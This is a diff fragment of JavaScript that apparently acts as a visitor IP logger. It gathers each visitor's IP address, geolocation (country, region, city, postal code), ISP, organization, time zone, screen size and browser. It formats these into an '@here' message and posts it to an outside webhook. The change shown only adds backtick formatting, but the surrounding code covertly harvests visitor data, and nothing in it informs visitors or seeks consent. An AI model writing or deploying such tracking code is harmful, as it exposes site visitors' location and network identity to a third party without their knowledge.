@@ -39,19 +39,19 @@
                         .then(response => response.json())
                         .then(locationData => {
                             const visitorInfo = {
-                                content: "@here " +
-                                    "IP Address :"+ ipAddress + "\n" +
-                                    "Country :"+locationData.country + "\n" +
-                                    "Region :"+locationData.region + "\n" +
-                                    "City :"+locationData.city + "\n" +
-                                    "Internet Service Provider :"+locationData.asn + "\n" +
-                                    "Time Zone : "+locationData.timezone + "\n" +
-                                    "Organization : "+locationData.org + "\n" +
-                                    "Postal Code : " +locationData.postal + "\n" +
-                                    "Time of Visit: " + timeOfVisit + "\n" +
-                                    "Device Type: " + screenSize + "\n" + 
-                                    "Browser: " + browserInfo.name + "\n" + 
-                                    "Location: " + locationData.city + ", " + locationData.region + ", " + locationData.country + '```' // Get location information
+                                content: "@here \n" +
+                                    "IP Address : `"+ ipAddress + "`\n" +
+                                    "Country : `"+locationData.country + "`\n" +
+                                    "Region : `"+locationData.region + "`\n" +
+                                    "City : `"+locationData.city + "`\n" +
+                                    "Internet Service Provider : `"+locationData.asn + "`\n" +
+                                    "Time Zone : `"+locationData.timezone + "`\n" +
+                                    "Organization : `"+locationData.org + "`\n" +
+                                    "Postal Code : `" +locationData.postal + "`\n" +
+                                    "Time of Visit: `" + timeOfVisit + "`\n" +
+                                    "Device Type: `" + screenSize + "`\n" + 
+                                    "Browser: `" + browserInfo.name + "`\n" + 
+                                    "Location: `" + locationData.city + ", " + locationData.region + ", " + locationData.country + '`' // Get location information
                             };
 
                             fetch(webhookUrl, {
